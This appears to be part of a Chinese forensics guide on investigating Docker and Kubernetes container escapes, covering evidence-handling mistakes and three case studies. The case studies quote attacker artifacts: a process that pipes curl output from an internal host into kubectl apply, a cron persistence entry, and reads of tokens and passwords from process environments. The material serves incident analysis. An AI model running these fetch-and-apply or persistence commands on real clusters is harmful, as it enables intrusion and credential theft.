> ⚠️ 本组每一条都会**永久销毁证据**。执行任何容器操作前，先确认 `3.1` 的采集顺序。

<a id="section-20"></a>

#### ★★★ 先 `docker stop` 再取证

**现象**：到场后第一反应是"先把容器停掉，防止它继续跑继续改"。

**原因**：容器一停，进程内存、`/proc` 视图、network namespace 里的连接表全部消失。这些恰恰是判断"有没有正在进行的突破"最直接的证据。

**影响**：**不可逆**。

内存里的命令行、打开的文件句柄、正在进行的连接、抓取中的临时文件——全部永久丢失。这类证据往往只能从运行时状态获得，磁盘上**根本没有对应物**。

事后无法补救，报告只能写"因容器已停止，无法确认当时是否存在活跃连接"。

**核查**：严格按 [3.1 第 1 步](#section-11) 的顺序——内存 → 状态 → 磁盘。采集完成并验证后，才考虑停止容器（且多数情况下根本不需要停）。

```bash
# 顺序不能颠倒
docker ps -a --no-trunc > /evidence/docker-ps.txt     # 1. 先固化容器清单
docker inspect <每个容器> > /evidence/inspect/          # 2. 再固化完整配置
# 3. 再考虑易失数据采集（见 3.1）
# 4. 最后才看要不要停 —— 通常不停
```

<a id="section-21"></a>

#### ★★★ 先 `docker rm` 再看 `upperdir`

**现象**：清理"无用容器"时顺手 `docker rm`，之后才发现要查那个容器。

**原因**：`docker rm` 会**整体删除容器可写层**（`overlay2/<id>/diff`）。突破时刻往容器里写的东西——WebShell、篡改后的配置、临时文件——**全部永久消失**。


**影响**：**不可逆**。

可写层是突破时刻改动的**唯一存在形式**。删掉之后，入侵者做了什么、有没有留后门、配置文件是否被篡改，**全部无从查证**。

这类案件的定性往往就依赖可写层里的痕迹。

**核查**：对 `upperdir` 立即做镜像拷贝（见[第 02 篇 镜像层与 overlay2 解析](../server-docker/server-docker-overlay2.md)），**在分析任何逻辑之前**。

```bash
# 知道容器 ID 后立即拷贝可写层
cp -a /var/lib/docker/overlay2/<id>/diff /evidence/upperdir-diff/
```

> 💡 **实务建议**：委托方常问"能不能先清理一下现场"。答案是**不能**。容器取证的前提是容器还在跑，可写层还在。

<a id="section-22"></a>

#### ★★ `docker exec` 采集却不记录

**现象**：为了在容器内跑自查脚本，直接 `docker exec <容器> sh -c '...'`。

**原因**：`exec` 会**在容器内留下痕迹**——shell 历史、`auditd` 记录、应用的连接日志；改变 `State`（比如短暂产生新进程）；某些应用（如数据库、监控 agent）**检测到 exec 会改变行为甚至告警**。

**影响**：**污染证据且无法自证**。

事后无法区分"这条记录是攻击者留下的，还是取证人员造成的"。一旦对方质疑痕迹的来源，你既无法证明也没法否认——**证据链被自己的操作打断**，且这种打断往往发生在最关键的时段。

**核查**：**优先 `docker cp`** 把脚本拷进去再执行，或用镜像里已有的工具读取。必须 `exec` 时，**在报告里逐条写明**：容器 ID、执行时间、执行的命令。

```bash
# 优先：拷进去执行，不产生 exec 记录
docker cp /evidence/container-selfcheck.sh <容器>:/tmp/selfcheck.sh
docker exec <容器> sh /tmp/selfcheck.sh   # 仍会产生 exec 记录，但至少有独立文件为证
# 报告必须记录：容器 ID、时间、命令全文
```

<a id="section-23"></a>

#### ★★ 取证中"顺手修一下"

**现象**：看到容器里有 WebShell 副本，就想"先删掉别让攻击者继续利用"。

**原因**：删文件、改配置、重启服务**都会破坏证据并销毁时间线**。而且这属于**未经授权的变更**，可能构成新的法律责任。

**影响**：**销毁证据 + 潜在的法律责任**。

删除动作不可逆；若涉及正在运行的业务系统，还可能构成对委托方系统的未授权变更。

另：取证人员修改证据后再出具报告，在质证时会被整体质疑可信度。**"你动过现场"这句话足以让整份报告失去说服力。**

**核查**：**全程只读**。所有操作留操作日志（谁、何时、做了什么、为什么）。有疑问的动作先停下来问委托方。

<a id="section-24"></a>

### 4.2 配置误读——结论方向性错误

<a id="section-25"></a>

#### "没装漏洞补丁 ≠ 没被逃逸"

**现象**：检查容器镜像版本，发现都是有官方补丁的版本，报告写"未发现已知漏洞利用痕迹"。

**原因**：容器逃逸**根本不需要漏洞**。以下配置本身就等于"没有隔离"：

**影响**：**方向性错误**。

把"没有 CVE"当"没有逃逸"，会直接关闭整条入侵路径。而容器逃逸恰恰**最不需要漏洞**，配置不当就等于没有隔离。

这类结论一旦写进报告，后续所有排查都会停止在这里。

| 配置 | 后果 |
|---|---|
| `--privileged` | 所有 capability + 全部设备 |
| `-v /:/host` | 宿主机根目录可读写 |
| `--pid=host` | 可见全部进程，`/proc/*/environ` 凭据一览无余 |
| Docker API 2375 暴露 | 等同宿主机 root |
| `CAP_SYS_ADMIN` | 可挂载、可操作 namespace |

**核查**：**配置面必须单独清点**（见 [2.4 高危配置清单](#section-6)）。这是比"找 CVE"更基础的一步。

<a id="section-26"></a>

#### 看到 `docker.sock` 就写"已获得 root"

**现象**：容器内能访问 `/var/run/docker.sock`，报告直接定性"攻击者已获得宿主机 root 权限"。

**原因**：`docker.sock` 存在只证明**有可访问的路径**，不证明**实际被利用过**。这是"能力"而非"行为"。


**影响**：**把"能力"当"行为"**，属于证据不足的定性。

对方一旦举证"该 socket 从未被调用过"，你的定性就站不住。更严重的是可能反向影响责任认定——把未证实的行为写成既成事实。
**核查**：需要旁证。**容器创建记录**（非业务基线镜像的容器）+ **镜像拉取记录** + **宿主机侧的容器/文件变化**，三者结合才能支撑"已被利用"。

```bash
# 旁证方向
docker events --since '2024-01-01' --until '2024-04-01'   # 拉取/创建事件
journalctl -u docker | grep -E 'image|exec|create'          # daemon 日志
# 宿主机侧：/etc/passwd、authorized_keys、crontab 的 mtime
```

<a id="section-27"></a>

#### 漏查 `latest` tag 与实际 digest

**现象**：K8s 清单里写 `image: myapp:latest`，报告写"运行的是 latest 版本"。

**原因**：节点缓存导致**声明的 tag 与实际运行的镜像可能不一致**。`latest` 在不同节点解析到不同 digest。


**影响**：**归因到错误的版本**。

若实际运行的是存在已知漏洞的旧 digest，而报告写"运行 latest 版本，未发现已知漏洞"，则漏洞利用的可能性被完全排除，真实的攻击入口被漏掉。
**核查**：比对 **`imageID`（`sha256:...`）** 与仓库侧 digest。**以 imageID 为准**，tag 只是标签。

```bash
kubectl get pod -o jsonpath='{.items[*].status.containerStatuses[*].imageID}'
docker inspect -f '{{.Image}}' <容器>       # 返回 sha256 digest
```

<a id="section-28"></a>

### 4.3 环境识别错误——数据取错地方

<a id="section-29"></a>

#### 只查容器内，不查宿主机

**现象**：在容器内翻遍文件，没发现异常，写"未发现逃逸痕迹"。

**原因**：逃逸类案件的**定性证据大多在宿主机**——`~/.ssh/authorized_keys`、宿主机 crontab、`/etc/passwd` 新增账户、宿主机日志。这些是逃逸后的**落脚点**。

**影响**：**错过唯一能定性证据的地方**。

逃逸行为的"落脚点"（新增账户、SSH 密钥、计划任务）都在宿主机。只查容器内几乎必然得出"未发现逃逸"的错误结论。

**核查**：[3.4 第 4 步：宿主机侧的突破痕迹](#section-14) 不能省。

<a id="section-30"></a>

#### 用 `ls /proc` 判 PID 数量

**现象**：`ls /proc | wc -l` 得到 40，报告写"容器内约 40 个进程"。

**原因**：`/proc` 下有大量**非数字项**（`self`、`net`、`sys`、`cpuinfo`、`meminfo` 等几十个非进程条目）。


**影响**：数量偏差不大时不易察觉，但一旦用它推断"容器内进程数异常/正常"，结论就是错的。取证报告里的任何数字都可能被对方逐项复核。

**核查**：只统计数字命名的 PID 目录，或直接查进程表。

```bash
ls /proc | grep -cE '^[0-9]+$'     # 正确
```

<a id="section-31"></a>

#### 忽略 cgroup v1/v2 差异

**现象**：按 cgroup v1 路径规律去找容器信息，在 v2 主机上什么都没找到。

**原因**：**cgroup v2 只有 `0::` 一行**，路径形态与 v1 完全不同。


**影响**：**取不到数据而不自知**。

cgroup 路径是判断"我在哪个容器里"的关键依据。按 v1 规律去 v2 主机上找会一无所获，报告可能因此漏掉容器归属关系。

**核查**：先判定版本再选路径形态，不要假设路径规则跨版本通用。

```bash
# 先判断版本
stat -fc %T /sys/fs/cgroup/    # cgroup2fs → v2；tmpfs → v1

# v1：路径形如 /docker/<64位ID>、/kubepods/...
cat /proc/self/cgroup

# v2：只有 0::/ 开头，ID 在下面几行
cat /proc/self/cgroup
cat /proc/1/cgroup
```

<a id="section-32"></a>

#### 把镜像里的 `/proc/self/status` 当宿主机的

**现象**：从镜像里导出 `/proc/self/status`，当作事发环境的能力集。

**原因**：`/proc/self/status` 是**运行时**的值，不同 capability、seccomp、AppArmor 下完全不同。镜像里的文件是**构建期的静态内容**。


**影响**：**能力评估完全失真**。

镜像里的 capability 集是构建期的，实际运行时可能被 `cap_drop`、`no-new-privileges`、seccomp 收紧。基于镜像文件判断隔离强度，结论方向可能完全相反。
**核查**：在**事发容器**内采集，并**记录采集位置**（容器 ID/名称 + 时间）。

<a id="section-33"></a>

#### 把 `docker inspect` 的 `State.Pid` 当容器内 PID

**现象**：拿到 `State.Pid = 31415`，去容器内 `ps` 找 31415，找不到。

**原因**：`State.Pid` 是**宿主机命名空间里的 PID**。容器内有自己的 PID 命名空间，通常从 1 开始。`--pid=host` 时两者才一致。


**影响**：**交叉验证失效**。

若要靠 PID 把容器内的进程与宿主机上的文件访问关联起来，PID 错位会导致关联错误——可能把无辜的进程关联到攻击行为上。
**核查**：记录采集时的**容器 ID 与时间**；`--pid=host` 与非 host 两种情况分开处理。

<a id="section-34"></a>

#### 以为静态 Pod 有完整审计记录

**现象**：查 API Server 审计日志，找不到某些 Pod 的创建记录，据此认为该 Pod"可疑"或"不存在"。

**原因**：**静态 Pod 由 kubelet 直接拉起**，绕过 API Server，因此部分创建动作**在审计日志里看不到**。


**影响**：**凭空产生怀疑**。

审计日志里查不到就认为"该 Pod 可疑"，是典型的过度推断。反过来，真正通过静态 Pod 部署的恶意组件也会因此被漏掉。
**核查**：直接读 kubelet 的清单目录。

```bash
ls -l /etc/kubernetes/manifests/
cat /etc/kubernetes/manifests/*.yaml
```

<a id="section-35"></a>

### 4.4 结论表述

<a id="section-36"></a>

#### 把阴性发现写成"不存在逃逸"

**现象**：查了容器内、查了 2 小时日志、没发现问题，报告写"未发现容器逃逸痕迹"。

**原因**：这是**过度断言**。你的检查范围有限（没查宿主机 / 时间窗只有 2 小时 / 没查镜像层），却写成了绝对结论。一旦现场后续发现其他证据，整份报告的可信度都会被推翻。


**影响**：**过度断言在质证时崩塌**。

一旦现场后续发现其他证据（另一台主机、另一个时间段），报告的"未发现"就变成"漏查"，整体可信度受质疑。

**边界声明是取证报告的信誉基础。**
**核查**：写"在 X 范围内未发现 Y"，并明确列出未覆盖的范围。

```text
✅ 正确表述：
   在 2024-03-01 至 2024-03-15 的容器运行日志与可写层中未发现
   突破痕迹。未覆盖范围：宿主机侧 3.4 节尚未执行、镜像层未展开、
   3.1 的内存采集未进行。

❌ 错误表述：
   未发现容器逃逸痕迹。
```

这个差别在质证时是决定性的——前者陈述事实与边界，后者是无法支撑的断言。

---


<a id="section-37"></a>

## 五、案例示例

<a id="section-38"></a>

### 5.1 六项隔离状态同时失效的实测与配置面定性

**场景**

委托方报告其容器化交付平台遭入侵，怀疑"服务被从内部突破"。已对一台应用节点与一台 K8s 控制平面节点做磁盘镜像（`DigiForensics.dd`×2，raw，ext4 起始扇区 2048），事发时容器平台仍在运行。

这条路径值得先走，是因为**"有没有发生逃逸"在很多现场其实是个错问题**。当容器同时具备特权运行、seccomp 关闭、宿主机根目录挂载、持有 `docker.sock`、hostPID、宿主机网络时，隔离边界在**配置层面**就已经不存在了——再去找"用了哪个内核漏洞"是徒劳的。**配置面是单方面可证的，它比利用链更早、也更硬。**

**处置过程**

第 1 步 · 抢时间采集（★ 本案做对的第一件事）

运维在接到委托后未重启主机。取证人员在到达现场后 20 分钟内按 3.1 的顺序完成内存 → 容器状态 → `/run` 快照 → 磁盘镜像。其中内存镜像 32.1 GB，里面保留了攻击者进程的环境变量与已建立的网络连接；若先重启主机，这部分证据永久消失。

**第 2 步 · 隔离配置面清点**（用 3.2 的高危速筛脚本）

```
[6d4f7b2c1a9b] Privileged=true  ← 隔离全关
[6d4f7b2c1a9b] Binds=/var/lib/docker/overlay2/6d4f7b2c1a9b/diff:/run/app  ← ★ 挂载自身可写层
[a71b93c04e2d] Binds=/var/run/docker.sock:/var/run/docker.sock  ← ★ 运行时 API 控制权
[b3c9e0a15f47] PidMode=host  ← 可见宿主机全部进程
[9f2e1d3c8b06] CapAdd=['SYS_ADMIN']  ← 能力过授
```

**发现 1**：`digiforensics-app` 容器（容器 ID `6d4f7b2c1a9b…`）以 `--privileged` 运行，且把自身 overlay2 可写层挂载进了容器。这一条配置本身就足以让容器内任何进程改写应用自身文件系统，隔离形同虚设。

第 3 步 · 容器内隔离状态实测（★ 必须在容器存活时，用 3.3 的 selfcheck 脚本）

```
=== 2. Capability 与 seccomp ===
CapPrm: 0000003fffffffff          ← ★ 全集
CapEff: 0000003fffffffff          ← ★ 全集 = 特权运行
NoNewPrivs: 0
Seccomp: 0                        ← ★ 未启用系统调用过滤

=== 3. mountinfo 规模与宿主机痕迹 ===
312                               ← 远超普通容器的 20~30 行
2466 259:3 / /host / /host rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro
                                     ↑ source 是 /，即宿主机根目录

=== 4. 运行时 socket / 设备 / proc 视图 ===
srw-rw---- 1 root root 8,58 Aug 18 03:11:03 /var/run/docker.sock
可见 PID 数：4172                          ← ★ 远超容器内进程数 = --pid=host
```

**发现 2（定性证据）**：该容器同时满足"特权运行 + seccomp 关闭 + 可见宿主机根文件系统 + 持有 docker.sock + PID 数 4172 + 使用宿主机网络"六项。 mountinfo 里 `/host` 挂载点的 source 是 `/`（ext4 `/dev/sda1`），即宿主机根目录被直接挂载进容器。 这不是"可能存在逃逸路径"，而是**隔离边界在配置层面已经不存在**。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| `digiforensics-app` 容器以 `--privileged` 运行 | `docker inspect` 的 `HostConfig.Privileged=true` | **强（直接证据）** |
| 该容器 seccomp 未启用、能力为全集 | 容器内 `/proc/self/status` 实测 | **强（直接证据）** |
| 宿主机根目录、`/var/lib/docker`、`/etc/kubernetes` 被挂入容器 | 容器内 `/proc/self/mountinfo` | **强（直接证据）** |
| 容器持有 `docker.sock` | 容器内 `ls -l /var/run/docker.sock` | **强（直接证据）** |
| 容器可见宿主机全部进程（PID 数 4172） | 容器内进程枚举 | **强（直接证据）** |
| **该容器的隔离边界在配置层面已失效** | 以上六项同时成立 | **强（配置面可单方面证实）** |
| **是否发生过内核级逃逸利用** | 无相关证据 | **不成立——见误判对照，本案不需要这个问题成立** |

**本节能证明**：事发前该容器的隔离配置已失效，且这一状态**可由配置与 `/proc` 单方面证实**，不依赖任何攻击侧证据。
**本节不能证明**：失效配置被使用的时间点与具体操作内容、是否存在更早的独立突破。

**误判对照**

这个案例最容易出的错是**反过来**——不是放过一个逃逸，而是过度关注"用了什么 CVE"从而漏掉更要紧的配置问题。

1. **判据**：`privileged: true` 与 `CapEff: 0000003fffffffff`（能力全集）两者的证明力不同。`privileged` 是启动参数（可从 `docker inspect` 读到），`CapEff` 是**运行时实测**。当两者同时成立时，结论应当是"**该容器在运行期实际拥有全部能力**"，而不是"启动时申请了特权但可能被降权"。本案的实测值排除了降权的可能。
2. **判据**：**"存在逃逸路径"与"发生了逃逸"必须分开写**。配置失效只证明前者。本案的突破事实来自完全不同的证据面——宿主机上出现了**引用容器 `diff` 路径的 SUID 二进制**（见 5.2），那才是"发生了"的物证。如果只做配置面清点就写"已确认发生容器逃逸"，缺的是物证支撑。
3. **判据**：`/host` 挂载点的 source 必须看 mountinfo，不能只看 `docker inspect` 的 `Binds`。`Binds` 只告诉你"挂了什么路径"，mountinfo 里的 `2466 259:3 / /host` 才能证明 source 是宿主机根 `/`。二者结合才构成"宿主根目录被挂入"的完整链条。少看 mountinfo 会漏掉 bind mount 指向根目录这一最严重的情况。
   **判据**：PID 数 4172 不能直接写成"用了 hostPID"。它只能证明"容器内可见的进程数远超其自身进程数"。确认 hostPID 的判据是 `docker inspect` 的 `HostConfig.PidMode == "host"`，或容器内 `/proc/1/cmdline` 为宿主机 init 进程。本案两者都有，故成立。

按错误判据走，第 2 条踩中会让报告停在"可能存在逃逸路径"，而委托方真正要问的是"我们的隔离还剩什么"。

只答"可能存在"而不给配置面清单，等于没回答管理问题，整改方案也就无从谈起。

更关键的是：配置失当是**委托方自己的责任点**，它与入侵行为是两条独立结论线。**混在一起写会让责任认定纠缠不清**，这一点在涉及责任追偿的委托里尤其要避免。

<a id="section-39"></a>

### 5.2 SUID 二进制的容器内来源与 DaemonSet 持久化组合

**场景**

承接 5.1。委托方在看到配置面结论后追问："那他到底跑到宿主机上做了什么？我们想知道他落地了什么。"

这需要换证据面——**从"配置允许"转到"实际发生了"**。宿主机文件系统上的物证是唯一能回答这个问题的材料。

**处置过程**

**第 1 步 · 在宿主机上找新增的提权物证**

```bash
find / -xdev -type f -perm -4000 -newermt '2024-03-01' 2>/dev/null
# /usr/local/bin/df-helper    ← ★ 3 月新增的 SUID 文件
```

**只有这一个。** 对照基线：Ubuntu 22.04 默认 SUID 文件是 `passwd`、`chsh`、`sudo`、`mount`、`umount`、`ping`、`gpasswd`、`newgrp`、`pkexec` 等十来个，全在 `/usr/bin` 或 `/bin` 下。`/usr/local/bin/` 目录下的 SUID 文件不属于任何发行版默认集合——这一条目录位置本身就带判别力。

```bash
# 全量枚举，确认是"新增"而不是"本来就有"
find / -xdev -type f -perm -4000 -printf '%TY-%Tm-%Td %m %u %p\
' 2>/dev/null | sort
# 2023-06-01 4000 root /usr/bin/passwd        ← 基线
# 2024-03-15 4000 root /usr/local/bin/df-helper ← ★
```

第 2 步 · 判定该 SUID 文件的来源（关键一步）

```bash
file /usr/local/bin/df-helper
# ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
strings /usr/local/bin/df-helper | head -20
# /var/lib/docker/overlay2/6d4f7b2c1a9b/diff/usr/local/bin/df-helper
#   ← ★ 二进制内容引用了容器可写层路径，说明它是从容器里带出来的
```

**这是本案最有力的一条物证**：二进制内部**硬编码了容器可写层的绝对路径**。这条字符串**不可能**出现在任何发行版工具里，且指向的容器 ID `6d4f7b2c1a9b` 与 5.1 第 2 步识别的高危容器完全一致——物证与配置面各自独立地指向同一个容器。

第 3 步 · 持久化：容器场景的 cron 形态

```bash
crontab -l; cat /etc/cron.d/* 2>/dev/null
# ★ */5 * * * * root docker start digiforensics-app 2>/dev/null
#   ← 容器重建后自动拉起 = 容器场景的持久化
```

这条 cron 的判别力在于**它的形态**：不是执行某个脚本，而是 `docker start` 一个已存在的容器。**它不依赖任何被删除的文件**——即便攻击者从容器里带出来的 SUID 二进制被清除，这条 cron 依然有效，容器会被重新拉起。**清除顺序错了，就会反复复活。**

第 4 步 · K8s 侧形态清点（用 3.6 的全集群扫描脚本）

```
# 特权 Pod / hostPath 扫描结果
digiforensics/audit-shim  hostNamespace=['hostPID']  privileged=['shim']  hostPath=['/']

# kubectl get ds -A -o wide
digiforensics   node-exporter  6  6  6  6  6   12d
digiforensics   df-helper      1  1  1  1  1    2d   ← ★ 2 天前新建
```

**发现 5**：`df-helper` 这个 DaemonSet **创建于 2 天前**，而其宿主机的 SUID 文件创建于同一天（03-15）。"DaemonSet + SUID 二进制"是 K8s 环境里最典型的提权后持久化组合（对照[第 04 篇](server-k8s-kubernetes-artifact-map.md)的静态 Pod 持久化）。

**内存与进程侧的突破实证**

```bash
# 从内存镜像中提取进程信息（★ 授权后在隔离环境内执行）
volatility -f /mnt/evidence/mem-node1.lime linux.pslist > ps.txt
grep -E 'docker|kube|sh -c|curl|wget' ps.txt | head -20
# PID 21418  sh -c curl -s http://10.8.3.90:8080/ks | kubectl apply -f -
# PID 21433  containerd-shim-runc-v2 - namespace moby - id 6d4f7b2c1a9b

# 进程环境变量（脱敏后）
sudo tr '\0' '\
' < /proc/21418/environ | grep -E 'TOKEN|PASS'
# DB_PASSWORD=MyPa************3456
# K8S_TOKEN=eyJhbGciOiJSUzI1NiIs...（SA token）
```

**发现 6**：进程 `21418` 的命令行显示它从 `10.8.3.90:8080` 拉取 YAML 并通过 `kubectl apply` 提交——这是通过容器内 SA token 向 API Server 写入对象的直接证据，与[第 05 篇](server-k8s-configmap-secret.md)案例中的审计记录**互为印证**。同时该进程环境变量里同时存在**数据库口令与 SA token**，说明**突破后凭据已被集中获取**。

**结论**

| 结论 | 支撑证据 | 强度 |
|---|---|---|
| 新增 SUID 文件 `/usr/local/bin/df-helper` 源自容器可写层 | 文件字符串含容器 `diff` 路径，且容器 ID 与 5.1 高危容器一致 | **强（物证，且双源一致）** |
| 宿主机上确实发生了"容器 → 宿主机"的落地 | SUID 文件位置在 `/usr/local/bin`（非发行版默认路径）+ 内部引用容器 diff 路径 | **强（物证）** |
| `/etc/cron.d/` 新增 `docker start` 实现持久化 | 宿主 cron 原文 | **强（直接证据）** |
| `df-helper` DaemonSet 为提权后部署 | `kubectl get ds` 的 `creationTimestamp`（2 天前，与 SUID 同日） | 强 |
| 进程 `21418` 用容器内 SA token 向 API Server 提交对象 | 内存中 `pslist` 的完整命令行 + 审计日志 | **强（双源）** |
| 数据库口令与 SA token 已被同一进程持有 | 内存中 `environ`（脱敏后） | **强（直接证据）** |
| 攻击者真实 IP **未确定** | 内网 `10.8.3.90` 为跳板，C2 地址待网络侧确认 | **未决项** |
| 是否存在更早的突破（本次采集前）**未确定** | 内存仅覆盖最近一次启动周期 | **未决项** |

> **报告写法要点**：本案的核心结论不是"发现恶意文件"，而是 **"该容器的隔离配置在事发前就已失效"**——这既是入侵的**前置条件**，也是**委托方的管理责任点**。报告应把"配置失当"与"入侵行为"分成两条独立结论线：前者可由 `inspect` 与 `/proc` 单方面证实；后者需要内存、审计日志、文件物证三者交叉。同时**必须写明**：`df-helper` 的 SUID 位与 `df-helper` DaemonSet 属**新增的提权与持久化能力**，建议立即清除并核查其是否已被用于访问其他业务数据；`/etc/cron.d/` 中的 `docker start` 条目必须删除，否则任何一次容器重建都会让攻击者重新获得立足点。

**误判对照**

最容易出的错有两个方向，第二个更隐蔽也更容易被忽略。

1. **把"新增 SUID 文件"直接定性为"提权后门"**。判据：`/usr/local/bin/df-helper` 内部引用了 `/var/lib/docker/overlay2/6d4f7b2c1a9b/diff/...` 这条字符串，这证明它的来源是容器可写层，但"带出"这个动作本身不证明它带出后被用来提权。要主张"用于提权"，需要它在宿主环境下的执行痕迹（进程记录、审计、它自身产生的文件）。本案**未取得该执行证据**，因此正确表述是"宿主机上存在源自容器可写层的 SUID 文件，能力上具备提权条件，实际提权使用情况未确认"。
2. 把 `/etc/cron.d/` 里那条 cron 删掉就认为持久化已清除。这条 cron 的内容是 `docker start digiforensics-app`——它依赖的是"容器 `digiforensics-app` 本身还在"这个前提，而不是依赖任何被删除的文件。如果只删 cron 而不删容器，攻击者仍可通过其他路径（如重建时保留的容器配置）重新写入 cron；反之，如果只删容器不删 cron，cron 会每 5 分钟尝试拉起一个已不存在的容器（无害但会刷日志）。正确做法是两条一起处理，并按"cron → 容器 → 镜像 → 容器自身 diff 目录"的顺序清理，最后复查 `docker ps -a` 与 `/etc/cron.d/`。
3. **判据**：`strings` 命中容器 diff 路径**也可能来自合法的多阶段构建残留或运维脚本硬编码**。把它作为"容器内落地到宿主机"的判据时，要与**文件位置**（`/usr/local/bin/` 属非常规路径）、**创建时间**（落在攻击窗内）、**基线比对**（默认 SUID 集合里没有它）三项联合使用。**单独一条字符串命中，判别力不足以定性。**

按错误判据走，第 2 条踩中的代价是**清理后反复复发**。

运维按报告删了 cron，以为已闭环。几天后容器重建时攻击者重新落地，`/etc/local/bin/df-helper` 又出现在同一个位置——而这次现场已被破坏过一次，上一次的物证也不再新鲜。

**取证报告里的清理建议必须给出顺序而不只是清单**，否则交付方承担的是"说了但没做对"的责任。

<a id="section-40"></a>

### 5.3 反例 内存未采集导致的时间下界空白

**场景**

委托方在看完 5.1 与 5.2 的时间线后问："最早一次 SUID 文件创建是 03-15，DaemonSet 也是 2 天前。但内存镜像只覆盖了最近一次开机。03-15 之前有没有更早的动作？"

这个问题的答案本案给不出来——**不是查得不够仔细，是材料本身不覆盖那个时段**。把这件事说清楚，比给一个勉强的答案有价值得多。

**处置过程**

**第 1 步 · 先确定内存镜像的覆盖边界**

```bash
# lime 内存镜像的自带元数据
python3 -c "
import json
h=json.load(open('/mnt/evidence/mem-node1.lime.json'))
print('采集时间:', h.get('time'))
print('压缩格式:', h.get('metadata',{}).get('format'))
"
# 采集时间: 2024-03-18T14:05:22Z
```

第 2 步 · 判断能覆盖到多早（关键：看最后一次启动）

```bash
volatility -f /mnt/evidence/mem-node1.lime linux.pslist --pid 1 > pid1.txt
cat pid1.txt
# PID 1  init  [init]  03-18T06:02:11Z
```

主机最后一次启动时间是 03-18 06:02:11。这意味着内存里**只可能保留 06:02 之后创建/运行的进程**——03-15 的 SUID 文件创建、03-15 的 DaemonSet 部署、03-15 那次容器逃逸的**当时进程**，**全部不在镜像里**。

时间覆盖关系如下：

| 时间段 | 内存镜像 | 磁盘镜像 | 审计日志 | 能否回答 |
|---|---|---|---|---|
| 03-15（SUID 创建日） | ✗ | ✓ | ✓ | **部分**（有物证，无进程） |
| 03-15 – 03-18 06:02 | ✗ | ✓ | ✓ | **部分**（同上） |
| 03-18 06:02 – 14:05 | ✓ | ✓ | ✓ | **完整** |
| 03-18 14:05 之后 | ✗ | ✗ | ✓ | **仅审计日志** |

**第 3 步 · 在覆盖范围内能得出的最强结论**

```bash
# 03-18 06:02 之后的进程行为（内存内可查）
volatility -f /mnt/evidence/mem-node1.lime linux.pslist \
  | awk 'NR>2{print $2,$3,$4,$NF}' | grep -viE 'kworker|systemd|nginx|node_exporter' | head
# 21418  sh   curl -s http://10.8.3.90:8080/ks | kubectl apply -f -
# 21507  python3  /tmp/.cache/p.py
```

`21507` 这个 `python3 /tmp/.cache/p.py` 值得单独记录：路径在 `/tmp/.cache/` 下的单字母命名脚本，形态可疑，但**在本案中没有取得其内容**（进程已退出，内存中只残留命令行）。这属于**线索而非结论**。

第 4 步 · 覆盖范围外的能做什么（不能做什么）

可以做的：

```bash
# 1) 用审计日志补时间线（覆盖到 03-16 22:00 之后）
python3 audit_score.py /evidence/k8s/audit.log --since 2024-03-15 --top 20

# 2) 用磁盘镜像的文件系统时间线补（bash_history、at 日志、logrotate 后的旧日志）
find /mnt/df/var/log -name '*.gz' -newermt '2024-03-01' -printf '%TY-%Tm-%Td %p\
' | head
# 2024-03-16  /mnt/df/var/log/auth.log.2.gz       ← 轮转保留了 03-15 之前的登录记录

zcat /mnt/df/var/log/auth.log.2.gz | grep -E 'Failed|Accepted' | grep '2024-03-1[45]' | head
# 2024-03-15 04:11:22 node-1 sshd[20114]: Accepted publickey for deploy from 10.8.3.90
#   ← ★ 03-15 当天确有来自 10.8.3.90 的登录，与 SUID 文件创建同日
```

不能做的：**不能**声称"03-15 之前无异常"。**未采集内存不等于无异常，只等于无进程级证据。**

**结论**

| 问题 | 答案 | 依据 |
|---|---|---|
| 03-15 之前是否存在更早的突破 | **无法确定** | 内存镜像起于 06:02 采集、覆盖 06:02 后的运行期 |
| 03-15 04:11 是否有登录活动 | **是**，来自 `10.8.3.90` | `auth.log.2.gz`（轮转日志） |
| 该登录与 SUID 文件创建是否为同一主体 | **未确定** | 无审计日志记录 SSH 登录，需查 `authorized_keys` 的 mtime 与内容 |
| 06:02 之后是否有可疑进程 | **是**，`21418` 与 `21507` | 内存 `pslist` |
| `21507` 的 `python3 /tmp/.cache/p.py` 做了什么 | **不可得** | 进程已退出，内存中仅剩命令行 |

**限定范围**：本次阴性结论的覆盖范围是「主机 node-1 自 2024-03-18 06:02:11 启动至 14:05:22 采集之间的进程空间」。
**未覆盖范围**：03-15 至 03-18 06:02 的**进程空间**（内存已覆盖不到）；**未采集**：swap、 hibernation 文件、崩溃转储；**未查**：`/tmp/.cache/p.py` 是否仍存在于磁盘（需在镜像中单独确认其是否存在，若已被删除则无内容可取）；**未查**：另一台控制平面节点上的同类问题。

**误判对照**

这个反例最容易出的错有两个，都是关于"未覆盖"的表述。

1. 把"内存采集晚了 8 小时"写成"覆盖了全部行为"。这是取证现场最隐蔽的一种自欺——采集本身做得很规范，但采集时刻决定了它的证明边界，而这个边界如果不写出来，读报告的人会默认它覆盖了全部时段。判据：报告里凡出现"未发现"三字，**同句或紧邻必须出现覆盖范围的起止时刻**。正确表述是"在 06:02–14:05 的进程空间内未发现……"，而不是"未发现攻击者更早的活动"。
2. **把轮转日志与内存镜像的证明力混用**。`auth.log.2.gz` 证明 03-15 04:11 有一次 `publickey` 登录，**但它不证明那次登录做了什么**；内存里的 `21418` 证明进程执行了什么，**但它不覆盖 06:02 之前**。两类材料各自有边界，**混着用会让读者以为"登录 = 入侵行为"**。正确做法是分别陈述、并明确它们之间**没有因果证据**——本案那个 `10.8.3.90` 在内存进程的命令行里也出现了，这是两条独立材料里出现了同一个 IP，但"同一 IP"不等于"同一主体、不等于"该登录导致了 SUID 文件"。
3. **判据**：`p.py` 这类"形态可疑但内容不可得"的发现**必须标注为线索**。文件名 + 路径 + 进程名只能构成怀疑，无法构成认定。报告中把它与 SUID 文件（物证、已定性）并列而不加区分，会让读者误以为两者证明力相当。**建议在报告里用单独的"待查线索"小节承载这类条目**，与已认定结论物理隔开。

按错误判据走，第 1 条踩中，委托方会认为"03-15 到 03-18 这段是干净的"，从而**不追查那台节点上更早的凭据泄露**。

而本案已知 `03-15 04:11` 就有来自 `10.8.3.90` 的公钥登录。如果真正的入口是那次登录，那么把它归入"已排除时段"，等于把真凶划进了安全区。

第 2 条踩中则会让委托方把"登录记录"直接当成"入侵证据"写进对外通报，这在法律与合规场景下属于定性不当。

<a id="section-41"></a>

## 六、扩展阅读方向

